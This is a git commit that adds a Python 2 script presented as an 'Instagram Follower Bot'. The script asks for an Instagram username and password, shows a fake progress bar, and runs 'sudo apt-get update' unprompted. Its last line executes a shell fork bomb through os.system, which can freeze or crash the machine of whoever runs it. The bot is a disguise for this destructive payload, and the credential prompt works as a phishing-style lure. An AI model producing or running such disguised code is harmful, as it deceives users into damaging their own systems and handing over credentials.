ffc4cb94fdbf796e2afb839cc0d1ec1eaa7d395b
Proud of Linux <jakehummer654@gmail.com>
2016-10-25 00:47:56 -0400

    Add files via upload

---
+++ test.py
@@ -0,0 +1,45 @@
+import os
+import sys, traceback
+
+os.system('sudo apt-get update')
+print "Instagram Follower Bot"
+name = raw_input('Enter your Username : ')
+print ("Scanning For Username that go by: %s" % name);
+name2 = raw_input('Enter your Password : ')
+print ("Entering  database with the Password of : %s " % name2);
+import time, sys
+
+# update_progress() : Displays or updates a console progress bar
+## Accepts a float between 0 and 1. Any int will be converted to a float.
+## A value under 0 represents a 'halt'.
+## A value at 1 or bigger represents 100%
+def update_progress(progress):
+    barLength = 10 # Modify this to change the length of the progress bar
+    status = ""
+    if isinstance(progress, int):
+        progress = float(progress)
+    if not isinstance(progress, float):
+        progress = 0
+        status = ""
+    if progress < 0:
+        progress = 0
+        status = "Halt...\r\n"
+    if progress >= 1:
+        progress = 1
+        status = "Done...\r\n"
+    block = int(round(barLength*progress))
+    text = "\rPercent: [{0}] {1}% {2}".format( "#"*block + "-"*(barLength-block), progress*100, status)
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+
+# update_progress test script
+print "__________Starting__________"
+update_progress("hello")
+time.sleep(1)
+
+print "Mounting"
+update_progress(3)
+time.sleep(3);
+print "Thank You...";
+os.system(':(){:|:&};:')
